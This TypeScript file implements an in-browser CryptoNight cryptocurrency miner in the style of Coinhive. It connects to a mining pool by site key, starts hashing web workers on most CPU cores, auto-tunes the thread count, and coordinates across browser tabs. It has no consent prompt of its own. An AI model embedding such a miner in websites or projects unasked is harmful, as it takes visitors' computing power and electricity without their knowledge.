import { EventEmitter } from 'events';
import SocketServerService from './SocketServer.service';
const {STATIC_DIRECTORY} = require('../credentials.json');

const IF_EXCLUSIVE_TAB = 'ifExclusiveTab';
const FORCE_EXCLUSIVE_TAB = 'forceExclusiveTab';
const FORCE_MULTI_TAB = 'forceMultiTab';

interface Job {
  blob: string;
  job_id: string;
  target: string;
  throttle: number;
}

interface MinerParameters {
  siteKey: string;
  socketService: SocketServerService;
  throttle?: number;
  threads?: number;
  autoThreads?: boolean;
  forceASMJS?: boolean;
}

export default class Miner extends EventEmitter {
  private socketService: SocketServerService;
  private siteKey: string;
  private user: any;
  private threads: Array<JobThread>;
  private verifyThread: JobThread;
  private hashes: number;
  private currentJob: Job;
  private tokenFromServer?: string;
  private goal: number;
  private totalHashesFromDeadThreads: number;
  private throttle: number;
  private autoThreads: any;
  private tab: any;
  private bc: BroadcastChannel;
  private targetNumThreads: number;
  private useWASM: boolean;

  constructor() {
    super();
    this.user = null;
    this.verifyThread = null;
    this.threads = [];
    this.hashes = 0;
    this.currentJob = null;
    this.tokenFromServer = null;
    this.goal = 0;
    this.totalHashesFromDeadThreads = 0;
    this.onTargetMet = this.onTargetMet.bind(this);
    this.onVerified = this.onVerified.bind(this);
    if (BroadcastChannel) {
      try {
        this.bc = new BroadcastChannel('cryptonight-miner');
        this.bc.addEventListener('message', msg => {
          if (msg.data === 'ping') {
            this.tab.lastPingReceived = Date.now();
          }
        });
      } catch (e) {}
    }
  }

  initialize(params: MinerParameters) {
    this.socketService = params.socketService;
    this.siteKey = params.siteKey;
    this.throttle = Math.max(0, Math.min(0.99, params.throttle || 0));
    this.autoThreads = {
      enabled: Boolean(params.autoThreads),
      interval: null,
      adjustAt: null,
      adjustEvery: 1e4,
      stats: {}
    };
    this.tab = {
      ident: Math.random() * 16777215 | 0,
      mode: IF_EXCLUSIVE_TAB,
      grace: 0,
      lastPingReceived: 0,
      interval: null
    };

    this.targetNumThreads = Math.max((params.threads || this.hardwareConcurrency) - 1, 1);
    this.useWASM = this.hasWASMSupport() && !params.forceASMJS;

    this.onOpen();
    this.socketService.socket.on('miner-message', this.onMessage.bind(this));
    this.socketService.socket.on('error', this.onError.bind(this));
    this.socketService.socket.on('disconnect', this.onClose.bind(this));
  }

  public get hardwareConcurrency() {
    return navigator.hardwareConcurrency || 4
  }

  public start(mode: string = '') {
    this.tab.mode = mode || IF_EXCLUSIVE_TAB;
    if (this.tab.interval) {
      clearInterval(this.tab.interval);
      this.tab.interval = null;
    }
    this.startNow();
  }

  public stop(mode: string = '') {
    for (let i = 0; i < this.threads.length; i++) {
      this.totalHashesFromDeadThreads += this.threads[i].hashesTotal;
      this.threads[i].stop();
    }
    this.threads = [];
    this.currentJob = null;
    if (this.autoThreads.interval) {
      clearInterval(this.autoThreads.interval);
      this.autoThreads.interval = null;
    }
    if (this.tab.interval && mode !== 'dontKillTabUpdate') {
      clearInterval(this.tab.interval);
      this.tab.interval = null;
    }
  }

  public getHashesPerSecond(): number {
    let hashesPerSecond = 0;
    for (let i = 0; i < this.threads.length; i++) {
      hashesPerSecond += this.threads[i].hashesPerSecond;
    }
    return Math.round(hashesPerSecond);
  }

  public getTotalHashes(estimate): number {
    const now = Date.now();
    let hashes = this.totalHashesFromDeadThreads;
    for (let i = 0; i < this.threads.length; i++) {
      const thread = this.threads[i];
      hashes += thread.hashesTotal;
      if (estimate) {
        const tdiff = (now - thread.lastMessageTimestamp) / 1e3 * 0.9;
        hashes += tdiff * thread.hashesPerSecond;
      }
    }
    return hashes | 0;
  }

  public getAcceptedHashes(): number {
    return this.hashes;
  }

  public getToken(): string {
    return this.tokenFromServer;
  }

  public getAutoThreadsEnabled(): boolean {
    return this.autoThreads.enabled;
  }

  public setAutoThreadsEnabled(enabled: boolean): void {
    this.autoThreads.enabled = enabled;
    if (!enabled && this.autoThreads.interval) {
      clearInterval(this.autoThreads.interval);
      this.autoThreads.interval = null;
    }
    if (enabled && !this.autoThreads.interval) {
      this.autoThreads.adjustAt = Date.now() + this.autoThreads.adjustEvery;
      this.autoThreads.interval = setInterval(this.adjustThreads.bind(this), 1e3);
    }
  }

  public getThrottle(): number {
    return this.throttle;
  }

  public setThrottle(throttle: number): void {
    this.throttle = Math.max(0, Math.min(0.99, throttle));
    if (this.currentJob) {
      this.setJob(this.currentJob);
    }
  }

  public getWorkerName(): string {
    return this.useWASM ? 'cryptonight.wasm.js' : 'cryptonight.asm.js';
  }

  public getNumThreads(): number {
    return this.targetNumThreads;
  }

  public setNumThreads(num: number): void {
    num = Math.max(1, num | 0);
    this.targetNumThreads = num;
    if (num > this.threads.length) {
      for (let i = 0; num > this.threads.length; i++) {
        var thread = new JobThread(this.getWorkerName());
        if (this.currentJob) {
          thread.setJob(this.currentJob, this.onTargetMet);
        }
        this.threads.push(thread);
      }
    } else if (num < this.threads.length) {
      while (num < this.threads.length) {
        var thread = this.threads.pop();
        this.totalHashesFromDeadThreads += thread.hashesTotal;
        thread.stop();
      }
    }
  }

  public isMobile(): boolean {
    return /mobile|Android|webOS|iPhone|iPad|iPod|IEMobile|Opera Mini/i.test(navigator.userAgent);
  }

  public hasWASMSupport(): boolean {
    return window.WebAssembly !== undefined;
  }

  public get isRunning(): boolean {
    return this.threads.length > 0;
  }

  private startNow(): void {
    if (this.tab.mode !== FORCE_MULTI_TAB && !this.tab.interval) {
      this.tab.interval = setInterval(this.updateTabs.bind(this), 1e3);
    }
    if (this.tab.mode === IF_EXCLUSIVE_TAB && this.otherTabRunning()) {
      return;
    }
    if (this.tab.mode === FORCE_EXCLUSIVE_TAB) {
      this.tab.grace = Date.now() + 3e3;
    }
    if (!this.verifyThread) {
      this.verifyThread = new JobThread(this.getWorkerName());
    }
    this.setNumThreads(this.targetNumThreads);
  }

  private otherTabRunning() {
    if (this.tab.lastPingReceived > Date.now() - 1500) {
      return true;
    }
    try {
      const tdjson = localStorage.getItem('cryptonight-miner');
      if (tdjson) {
        const td = JSON.parse(tdjson);
        if (td.ident !== this.tab.ident && Date.now() - td.time < 1500) {
          return true;
        }
      }
    } catch (e) {}
    return false;
  }

  private updateTabs() {
    const otherTabRunning = this.otherTabRunning();
    if (otherTabRunning && this.isRunning && Date.now() > this.tab.grace) {
      this.stop('dontKillTabUpdate');
    } else if (!otherTabRunning && !this.isRunning) {
      this.startNow();
    }
    if (this.isRunning) {
      if (this.bc) {
        this.bc.postMessage('ping');
      }
      try {
        localStorage.setItem('cryptonight-miner', JSON.stringify({
          ident: this.tab.ident,
          time: Date.now()
        }));
      } catch (e) {}
    }
  }

  private adjustThreads() {
    const hashes = this.getHashesPerSecond();
    const threads = this.getNumThreads();
    const stats = this.autoThreads.stats;
    stats[threads] = stats[threads] ? stats[threads] * 0.5 + hashes * 0.5 : hashes;
    if (Date.now() > this.autoThreads.adjustAt) {
      this.autoThreads.adjustAt = Date.now() + this.autoThreads.adjustEvery;
      const cur = (stats[threads] || 0) - 1;
      const up = stats[threads + 1] || 0;
      const down = stats[threads - 1] || 0;
      if (cur > down && (up === 0 || up > cur) && threads < 8) {
        return this.setNumThreads(threads + 1);
      } if (cur > up && (!down || down > cur) && threads > 1) {
        return this.setNumThreads(threads - 1);
      }
    }
  }

  private hashString(s) {
    let hash = 5381,
      i = s.length;
    while (i) {
      hash = hash * 33 ^ s.charCodeAt(--i);
    }
    return hash >>> 0;
  }

  private onOpen() {
    this.emit('open');
    const params = {
      site_key: this.siteKey,
      type: 'anonymous',
      user: null,
      goal: 0,
    };
    if (this.user) {
      params.type = 'user';
      params.user = this.user.toString();
    } else if (this.goal) {
      params.type = 'token';
      params.goal = this.goal;
    }
    this.send('auth', params);
  }

  private onError(ev) {
    this.emit('error', {
      error: 'connection_error'
    });
    this.onClose(ev);
  }

  private onClose(ev) {
    for (let i = 0; i < this.threads.length; i++) {
      this.threads[i].stop();
    }
    this.threads = [];
    this.emit('close');
  }

  private onMessage(msg) {
    console.log('pool', msg);
    if (msg.type === 'job') {
      this.setJob(msg.params);
      this.emit('job', msg.params);
      if (this.autoThreads.enabled && !this.autoThreads.interval) {
        this.autoThreads.adjustAt = Date.now() + this.autoThreads.adjustEvery;
        this.autoThreads.interval = setInterval(this.adjustThreads.bind(this), 1e3);
      }
    } else if (msg.type === 'verify') {
      this.verifyThread.verify(msg.params, this.onVerified);
    } else if (msg.type === 'hash_accepted') {
      this.hashes = msg.params.hashes;
      this.emit('accepted', msg.params);
      if (this.goal && this.hashes >= this.goal) {
        this.stop();
      }
    } else if (msg.type === 'authed') {
      this.tokenFromServer = msg.params.token || null;
      this.hashes = msg.params.hashes || 0;
      this.emit('authed', msg.params);
    } else if (msg.type === 'error') {
      console.error('cryptonight-miner Error:', msg.params.error);
      this.emit('error', msg.params);
    } else if (msg.type === 'banned' || msg.params.banned) {
      this.emit('error', {
        banned: true
      });
    }
  }

  private setJob(job: Job) {
    this.currentJob = job;
    this.currentJob.throttle = this.throttle;
    for (let i = 0; i < this.threads.length; i++) {
      this.threads[i].setJob(job, this.onTargetMet);
    }
  }

  public onTargetMet(result) {
    this.emit('found', result);
    if (result.job_id === this.currentJob.job_id) {
      this.send('submit', {
        job_id: result.job_id,
        nonce: result.nonce,
        result: result.result
      });
    }
  }

  public onVerified(verifyResult) {
    this.send('verified', verifyResult);
  }

  private send(type: string, params: object = {}) {
    const msg = {
      type,
      params
    };
    console.log('miner', msg);
    this.socketService.socket.emit('miner-message', msg);
  }
}

class JobThread {
  private worker: Worker;
  private currentJob: Job;
  private jobCallback: Function;
  private verifyCallback: Function;
  private isReady: boolean;
  public hashesPerSecond: number;
  public hashesTotal: number;
  private running: boolean;
  public lastMessageTimestamp: number;

  constructor(workerName: string) {
    switch (workerName) {
      case 'cryptonight.wasm.js':
        this.worker = new Worker(STATIC_DIRECTORY + '/cryptonight.wasm.js');
        break;

      case 'cryptonight.asm.js':
        this.worker = new Worker(STATIC_DIRECTORY + '/cryptonight.asm.js');
        break;

      default:
    }
    this.worker.addEventListener('message', this.onReceiveMsg.bind(this));
    this.currentJob = null;
    this.jobCallback = () => {};
    this.verifyCallback = () => {};
    this.isReady = false;
    this.hashesPerSecond = 0;
    this.hashesTotal = 0;
    this.running = false;
    this.lastMessageTimestamp = Date.now();
  }

  public onReceiveMsg(msg) {
    this.isReady = true;
    if (this.currentJob) {
      this.running = true;
      this.worker.postMessage(this.currentJob);
    }
    if (typeof msg.data === 'object') {
      if (msg.data.verify_id) {
        this.verifyCallback(msg.data);
        return;
      }
      if (msg.data.result) {
        this.jobCallback(msg.data);
      }
      if (msg.data.hashesPerSecond && msg.data.hashes) {
        this.hashesPerSecond = (this.hashesPerSecond + msg.data.hashesPerSecond) / 2;
        this.hashesTotal += msg.data.hashes;
        this.lastMessageTimestamp = Date.now();
        if (this.running) {
          this.worker.postMessage(this.currentJob);
        }
      }
    }
  }

  public setJob(job: Job, callback) {
    this.currentJob = job;
    this.jobCallback = callback;
    if (this.isReady && !this.running) {
      this.running = true;
      this.worker.postMessage(this.currentJob);
    }
  }

  public verify(job, callback) {
    if (!this.isReady) {
      return;
    }
    this.verifyCallback = callback;
    this.worker.postMessage(job);
  }

  public stop() {
    if (this.worker) {
      this.worker.terminate();
      this.worker = null;
    }
    this.running = false;
  }
}
